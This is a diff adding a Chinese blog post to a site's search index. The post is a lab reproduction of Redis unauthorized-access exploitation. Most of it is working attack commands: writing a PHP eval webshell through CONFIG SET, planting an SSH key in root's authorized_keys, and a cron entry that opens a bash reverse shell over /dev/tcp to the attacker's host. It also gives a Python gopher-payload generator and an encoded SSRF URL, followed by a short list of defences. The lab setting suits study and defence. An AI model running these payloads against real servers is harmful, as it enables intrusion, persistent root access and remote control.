@@ -2871,4 +2871,84 @@
         <tag>学习笔记</tag>
       </tags>
   </entry>
+  <entry>
+    <title>redis未授权漏洞复现</title>
+    <url>/2025/02/27/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>继续增加实操经历！</p>
+<p>Redis 默认情况下，会绑定在 0.0.0.0:6379（<strong>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</strong>），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。</p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>影响版本  2.x，3.x，4.x，5.x</p>
+<p>这边直接在Ubuntu上装了个redis，在<a class="link"   href="http://download.redis.io/releases/" >这个链接<i class="fas fa-external-link-alt"></i></a>下载历史版本的redis，本地编译后修改一下配置文件redis.conf</p>
+<p>把这个保护模式从yes改成no，允许别的主机远程连接</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227135315.png" ></p>
+<p>把绑定ip这一行给注释掉，允许除本地外的主机远程登录redis服务</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227135359.png" ></p>
+<p>然后开启redis-server，这里我的版本是3.2.7</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227141637.png" ></p>
+<p>在kali这边连接，尝试ping，看到pong表示连接成功</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227141821.png" ></p>
+<h4 id="利用未授权写入webshell"><a href="#利用未授权写入webshell" class="headerlink" title="利用未授权写入webshell"></a>利用未授权写入webshell</h4><p><strong>条件</strong></p>
+<ul>
+<li>服务器的redis存在未授权，攻击机可以直接连接登陆</li>
+<li>服务器开了web服务器，攻击者知道web根目录</li>
+<li>对web目录有写入权限</li>
+</ul>
+<p>写入webshell思路是指定本地数据库存放目录设置为&#x2F;var&#x2F;www&#x2F;html，指定本地数据库文件名为shell.php，于是我们就可以写入一个路径为&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php的Webshell文件</p>
+<p>原理是我们在数据库中插入一条webshell代码数据，代码作为value，key随便，相当于把缓冲数据保存在shell.php里</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/ </span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; <span class="built_in">set</span> xxx <span class="string">&quot;&lt;?php eval(<span class="variable">$_POST</span>[&#x27;whoami&#x27;]);?&gt;&quot;</span> </span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227143818.png" ></p>
+<p>可以看到是成功的，这里注意有伤害代码要写成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;</span><br></pre></td></tr></table></figure>
+
+<p>多增加了一些换行符，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227144022.png" ></p>
+<h4 id="利用未授权写入ssh公钥"><a href="#利用未授权写入ssh公钥" class="headerlink" title="利用未授权写入ssh公钥"></a>利用未授权写入ssh公钥</h4><p>思路也是一样的，这次把数据库默认路径改成&#x2F;root&#x2F;.ssh，缓冲文件名改为authorized.keys</p>
+<p>先生成公私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p>在&#x2F;root&#x2F;.ssh下会有id_rsa.pub，读取出来写到目标路径里</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; </span><br><span class="line">192.168.64.189:6379&gt; </span><br><span class="line">192.168.64.189:6379&gt; </span><br><span class="line">192.168.64.189:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkvpZ7bfxoxuHQaCWbss1FfXaz7S30Es0fJtxqDtgV4d166hNSqBlIPDGcqzRfhsrbuCkQCAbWvz89Rh45POAVITVSPnZw8gIdXUsYrWmHFP8NExBc79K+yRh6ja2uFpIELEd1k4gQBfB0fg4G6st042I58Iaj8ZabfH5EgzEG4FOeK35usxk+jioIy/mtl6xwlucWFqQXjF4OAU58O2nmCbd9dtLmV/2ZDXDqAhdRSN0MB+iKfki+c2mq6rlhRpBK/xj6G0GVNlz9GkuYR50Zq2tUO6hKY130f6KW5yHSqezUIb0UpURL4mWYz7qErtNHZrTT5U/isCqp1VYcTDrS67Ax11PoMtzJuvuLtmNruW8pKvTCC9LYVUB+5U49RiHre8duFTkXe9Yx61yT3kmPN4Ocik8tzuTA6srmKIrr7UbLal+PinO/AYgaXDDPTINNgoMwXLbByzj31CSb8eB0TOv6qwQvn3nSlA2VQXnrS/og0jNaB5KPfg/WDNo0o+0= root@Flow\n\n&quot;</span></span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p>记得在写入内容前后都加换行，保证格式正确</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227145153.png" ></p>
+<p>然后就登陆上被攻击机的root了</p>
+<h4 id="利用未授权写入定时任务"><a href="#利用未授权写入定时任务" class="headerlink" title="利用未授权写入定时任务"></a>利用未授权写入定时任务</h4><p><strong>条件</strong></p>
+<p>除了前面所要求的，这次还多要求</p>
+<ul>
+<li>redis是root用户运行的</li>
+<li>机器有定时任务功能（Linux机器大多数会有）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.64.187/1234 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>尝试了半天，写入语句后查看&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root，也没看到反弹shell的命令，原来这个在Ubuntu上行不通，原因是：</p>
+<blockquote>
+<p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是-rw——-才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</p>
+<p>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p>
+<p><strong>由于系统的不同，crontrab定时文件位置也会不同：</strong></p>
+<p>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></p>
+<p>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;﻿</code></p>
+</blockquote>
+<h4 id="ssrf-redis写入webshell"><a href="#ssrf-redis写入webshell" class="headerlink" title="ssrf+redis写入webshell"></a>ssrf+redis写入webshell</h4><p><strong>利用条件</strong></p>
+<ul>
+<li>首先有一个ssrf漏洞</li>
+<li>redis没有设置密码认证</li>
+<li>知道网站根目录，有写入权限</li>
+</ul>
+<p>主要用到gopher协议，用到的命令和之前是一样的，要用一个脚本（网上找的）生成gopher协议后面的内容</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;192.168.64.189&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&quot;\n\n&lt;?php eval($_POST[\&quot;whoami\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path = <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span>  <span class="comment"># 此处也可以填入 Redis 的密码，在未授权的情况下适用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis 命令列表</span></span><br><span class="line">cmd = [</span><br><span class="line">    <span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">    <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">    <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">    <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">    <span class="string">&quot;save&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果有密码，则在命令中插入 AUTH 命令</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 gopher URL</span></span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis 命令格式化函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    </span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))  <span class="comment"># 使用正确的 urllib.parse.quote</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出最终构造的 payload</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>生成payload解码看到的</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227163515.png" ></p>
+<p>再编一次码，然后访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ssrf.php?url=gopher%3A%2F%2F192%2E168%2E64%2E189%3A6379%2F%5F%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524%5FPOST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell%2Ephp%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这样就能实现和之前一样的效果，当redis不对外开放时就可以考虑利用ssrf，这算是增加了攻击面，但是也要网站本身支持这些协议</p>
+<h4 id="常见防护设施"><a href="#常见防护设施" class="headerlink" title="常见防护设施"></a>常见防护设施</h4><p>很容易想</p>
+<p>开启防护模式，设置密码安全认证，不对外开放，修改端口为不常见的，给文件夹设置严格的访问权限</p>
+<p>先这样，后面再补充一下主从复制的内容</p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
 </search>
